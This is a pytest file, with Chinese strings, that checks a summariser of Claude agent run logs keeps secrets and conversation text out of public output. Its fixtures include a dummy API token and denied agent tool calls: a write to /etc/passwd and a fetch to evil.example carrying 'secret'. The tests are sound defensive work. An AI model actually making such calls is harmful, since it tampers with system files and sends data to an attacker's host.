"""daily-intel 失敗原因摘要：公開 log 只能出現錯誤欄位，不能出現對話、工具輸入或疑似金鑰。"""
import importlib.util
import json

from tools.common import SENTINEL_ROOT

spec = importlib.util.spec_from_file_location("ces", SENTINEL_ROOT / "scripts" / "claude-error-summary.py")
ces = importlib.util.module_from_spec(spec)
spec.loader.exec_module(ces)

SECRET = "sk-ant-oat01-" + "A" * 60


def run(tmp_path, capsys, messages, raw=None):
    p = tmp_path / "claude-execution-output.json"
    p.write_text(raw if raw is not None else json.dumps(messages, ensure_ascii=False), encoding="utf-8")
    assert ces.main(["x", str(p)]) == 0
    return capsys.readouterr().out


def test_auth_error_is_summarized_without_secrets(tmp_path, capsys):
    out = run(tmp_path, capsys, [
        {"type": "system", "subtype": "init", "model": "claude-sonnet-5-5", "apiKeySource": "none",
         "tools": ["Read"], "cwd": "/home/runner/work/x"},
        {"type": "user", "message": {"content": "使用者提示與網頁內容：機密段落"}},
        {"type": "assistant", "error": "authentication_failed",
         "message": {"content": [{"type": "text", "text": f"Invalid token {SECRET}"}]}},
        {"type": "result", "subtype": "success", "is_error": True, "num_turns": 1, "duration_ms": 166,
         "result": f"Invalid API key · {SECRET}\nPlease run /login"},
    ])
    assert "模型：claude-sonnet-5-5；驗證來源：none" in out
    assert "API 錯誤：authentication_failed" in out
    assert "錯誤訊息：Invalid API key · [REDACTED] Please run /login" in out
    assert SECRET not in out and "機密段落" not in out and "/home/runner" not in out


def test_success_result_text_is_not_printed(tmp_path, capsys):
    out = run(tmp_path, capsys, [{"type": "result", "subtype": "error_max_turns", "is_error": False, "num_turns": 40,
                                  "result": "最後一段對話內容"}])
    assert "subtype=error_max_turns" in out and "最後一段對話內容" not in out


def test_long_message_truncated_and_jsonl_supported(tmp_path, capsys):
    lines = "\n".join(json.dumps(m) for m in [{"type": "result", "is_error": True, "result": "x " * 500, "errors": ["e1"]}])
    out = run(tmp_path, capsys, None, raw=lines)
    msg = next(line for line in out.splitlines() if line.startswith("錯誤訊息："))
    assert len(msg) <= len("錯誤訊息：") + ces.LIMIT and "錯誤：e1" in out


def test_missing_or_empty_file(tmp_path, capsys):
    assert ces.main(["x", str(tmp_path / "none.json")]) == 0
    assert "找不到執行紀錄" in capsys.readouterr().out
    assert run(tmp_path, capsys, []).strip() == "執行紀錄中沒有可辨識的訊息"


def test_permission_denials_listed_without_content(tmp_path, capsys, monkeypatch):
    monkeypatch.chdir(tmp_path)
    cwd = str(tmp_path)
    out = run(tmp_path, capsys, [{"type": "result", "subtype": "success", "is_error": False, "num_turns": 3,
        "result": "最後的對話內容", "permission_denials": [
            {"tool_name": "Write", "tool_input": {"file_path": f"{cwd}/out/intel-daily.json", "content": "機密內容"}},
            {"tool_name": "Write", "tool_input": {"file_path": "/etc/passwd", "content": "x"}},
            {"tool_name": "Read", "tool_input": {"file_path": "out/stack.json"}},
            {"tool_name": "WebFetch", "tool_input": {"url": "https://evil.example/path?q=secret", "prompt": "p"}},
            {"tool_name": "Agent", "tool_input": {"subagent_type": "other", "prompt": "做壞事"}},
        ]}])
    lines = [line for line in out.splitlines() if line.startswith("權限拒絕：")]
    assert lines == ["權限拒絕：Write out/intel-daily.json", "權限拒絕：Write （工作目錄外）…/passwd",
                     "權限拒絕：Read out/stack.json", "權限拒絕：WebFetch evil.example", "權限拒絕：Agent subagent=other"]
    for leaked in ("機密內容", "最後的對話內容", "secret", "做壞事", "/etc/"):
        assert leaked not in out


def test_tool_activity_errors_and_final_message(tmp_path, capsys):
    msgs = [
        {"type": "assistant", "message": {"content": [
            {"type": "tool_use", "id": "t1", "name": "Read", "input": {"file_path": "out/stack.json"}},
            {"type": "tool_use", "id": "t2", "name": "Agent", "input": {"subagent_type": "news-scout", "prompt": "搜尋機密"}}]}},
        {"type": "assistant", "parent_tool_use_id": "t2", "message": {"content": [
            {"type": "tool_use", "id": "t3", "name": "WebSearch", "input": {"query": "查詢內容"}}]}},
        {"type": "user", "message": {"content": [
            {"type": "tool_result", "tool_use_id": "t1", "is_error": True, "content": "File does not exist."},
            {"type": "tool_result", "tool_use_id": "t3", "is_error": True, "content": [{"type": "text", "text": "Web search unavailable " + "x" * 300}]},
            {"type": "tool_result", "tool_use_id": "t2", "is_error": False, "content": "網頁內容不該出現"}]}},
        {"type": "result", "subtype": "success", "is_error": False, "num_turns": 7, "result": "找不到 out/stack.json，無法進行。"},
    ]
    p = tmp_path / "exec.json"
    p.write_text(json.dumps(msgs, ensure_ascii=False), encoding="utf-8")
    assert ces.main(["x", "--with-result", str(p)]) == 0
    out = capsys.readouterr().out
    assert "工具呼叫（主 Agent）：Agent(news-scout)×1、Read×1" in out
    assert "工具呼叫（Subagent）：WebSearch×1" in out
    assert "工具錯誤：Read：File does not exist." in out
    err = next(line for line in out.splitlines() if line.startswith("工具錯誤：WebSearch"))
    assert len(err) <= len("工具錯誤：WebSearch：") + 150
    assert "Claude 最後的說明：找不到 out/stack.json，無法進行。" in out
    for leaked in ("搜尋機密", "查詢內容", "網頁內容不該出現"):
        assert leaked not in out
    assert ces.main(["x", str(p)]) == 0                       # 沒有 --with-result 時不印最後的說明
    assert "Claude 最後的說明" not in capsys.readouterr().out


def test_blocked_webfetch_hosts_aggregated(tmp_path, capsys):
    msgs = [
        {"type": "assistant", "parent_tool_use_id": "a1", "message": {"content": [
            {"type": "tool_use", "id": f"w{i}", "name": "WebFetch", "input": {"url": u, "prompt": "p"}}
            for i, u in enumerate(["https://focustaiwan.tw/a?secret=1", "https://focustaiwan.tw/b", "https://newtalk.tw/c",
                                   "https://www.ithome.com.tw/d"])]}},
        {"type": "user", "message": {"content": [
            {"type": "tool_result", "tool_use_id": "w0", "is_error": True, "content": "PreToolUse:WebFetch hook error: WebFetch 只允許受信任來源的 HTTPS 網址"},
            {"type": "tool_result", "tool_use_id": "w1", "is_error": True, "content": "PreToolUse:WebFetch hook error: WebFetch 只允許受信任來源的 HTTPS 網址"},
            {"type": "tool_result", "tool_use_id": "w2", "is_error": True, "content": "PreToolUse:WebFetch hook error: WebFetch 只允許受信任來源的 HTTPS 網址"},
            {"type": "tool_result", "tool_use_id": "w3", "is_error": True, "content": "HTTP 403"}]}},
    ]
    out = run(tmp_path, capsys, msgs)
    assert "WebFetch 被擋的網站（不在信任清單）：focustaiwan.tw×2、newtalk.tw×1" in out
    assert "工具錯誤：WebFetch www.ithome.com.tw：HTTP 403" in out
    assert "secret" not in out and "/a" not in out
